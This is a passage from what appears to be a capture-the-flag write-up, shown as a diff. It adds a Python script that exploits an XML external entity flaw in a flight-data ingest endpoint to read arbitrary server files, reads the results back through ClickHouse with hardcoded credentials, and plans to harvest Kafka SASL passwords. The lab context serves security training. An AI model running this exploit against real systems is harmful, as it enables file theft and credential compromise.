@@ -913,6 +913,99 @@ dhcpcd:x:100:65534:DHCP Client Daemon,,,:/usr/lib/dhcpcd:/bin/false
 ```
 
 Key finding: the parser resolves external entities, giving arbitrary file read exfiltrated through ClickHouse. Accounts with real login shells are `root`, `svc-infra` (uid 1000), and `martin_cole` (uid 1001); a `clickhouse` service account and the `_laurel` audit logger are also present. `svc-infra` is the first pivot target, so the next files to read are its service configuration for reusable secrets.
+<div align="center">
+<br>
+※※※※※※※※※※※※※※※※※※※※※※※※
+<br>
+<br>
+</div>
+
+#### 3.1.3 Build a reusable file-read helper
+
+Hand-writing a document per file is slow. Wrap the submit-wait-readback loop in a script that takes a path, generates a fresh entity name and `transaction_id` each call, submits, then polls ClickHouse until the row appears. Use it first on the Kafka systemd unit to locate the broker's config and run-as user.
+
+**Command:**
+
+```bash
+cat > aidx-read.py <<'PY'
+#!/usr/bin/env python3
+import sys, time, secrets, requests
+
+INGEST = "http://api.htb-airport.htb:8081/feeds/aidx"
+CH = "http://db.htb-airport.htb/"
+AUTH = ("svc_events", "Yl4aCgh4y2PnU")
+
+def read(path):
+    txid = "xxe-" + secrets.token_hex(4)
+    ent  = "e" + secrets.token_hex(3)
+    xml = f'''<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE IATA_AIDX_FlightLegNotifRQ [ <!ENTITY {ent} SYSTEM "file://{path}"> ]>
+<IATA_AIDX_FlightLegNotifRQ xmlns="http://www.iata.org/IATA/2007/00" Version="22.1" TimeStamp="2026-10-17T12:00:00Z" TransactionIdentifier="{txid}">
+  <Originator><CompanyShortName>TST</CompanyShortName><Code>TS</Code></Originator>
+  <FlightLeg><LegIdentifier>
+    <Airline CodeContext="3">&{ent};</Airline>
+    <FlightNumber>999</FlightNumber>
+    <DepartureAirport CodeContext="3">XXX</DepartureAirport>
+    <ArrivalAirport CodeContext="3">YYY</ArrivalAirport>
+    <OriginDate>2026-10-17</OriginDate>
+    <RepeatNumber>1</RepeatNumber>
+  </LegIdentifier></FlightLeg>
+</IATA_AIDX_FlightLegNotifRQ>'''
+    r = requests.post(INGEST, data=xml.encode(), headers={"Content-Type": "application/xml"}, timeout=15)
+    if '"accepted":true' not in r.text:
+        print("[-] ingest rejected:", r.text); return
+    q = f"SELECT airline FROM partner_feed.flightleg_json WHERE transaction_id='{txid}' FORMAT RawBLOB"
+    for _ in range(20):
+        time.sleep(2)
+        resp = requests.get(CH, params={"query": q}, auth=AUTH, timeout=15)
+        if resp.text.strip():
+            print(resp.text); return
+    print("[-] no data returned; resend or reset the box")
+
+if __name__ == "__main__":
+    if len(sys.argv) != 2:
+        print(f"usage: {sys.argv[0]} /absolute/path"); sys.exit(1)
+    read(sys.argv[1])
+PY
+
+python3 aidx-read.py /etc/systemd/system/kafka.service
+```
+
+**Breakdown:**
+
+| Component | Purpose | Simple Explanation |
+| --------- | ------- | ------------------ |
+| `txid = "xxe-" + secrets.token_hex(4)` | Unique anchor | A fresh `transaction_id` per call so each result is queried back without collisions. |
+| `ent = "e" + secrets.token_hex(3)` | Unique entity name | A new entity name each time; the parser caches an entity name to its first fetched value, so reusing one returns stale content. |
+| `SYSTEM "file://{path}"` | External entity | Points the entity at the requested file on the server. |
+| POST to `/feeds/aidx` | Submit | Sends the generated document to the ingest endpoint. |
+| poll loop with `FORMAT RawBLOB` | Read back | Queries ClickHouse every 2 seconds until the parsed `airline` value is non-empty, printing it verbatim. |
+
+**Result:**
+
+```shell
+[Unit]
+Description=Apache Kafka Distributed Message Broker
+Documentation=https://apache.org
+After=network.target
+
+[Service]
+Type=simple
+User=svc-infra
+Group=svc-infra
+SupplementaryGroups=kafka-data
+WorkingDirectory=/opt/kafka_2.13-4.3.1
+ExecStart=/opt/kafka_2.13-4.3.1/bin/kafka-server-start.sh /opt/kafka_2.13-4.3.1/config/server.properties
+ExecStop=/opt/kafka_2.13-4.3.1/bin/kafka-server-stop.sh
+Restart=on-failure
+RestartSec=10s
+
+[Install]
+WantedBy=multi-user.target
+```
+
+Key finding: the broker runs as `svc-infra` and reads `/opt/kafka_2.13-4.3.1/config/server.properties`. Kafka stores its SASL account passwords in that file, so reading it next should yield a secret for the `svc-infra` account.
+
 
 <div align="center">
 <br>
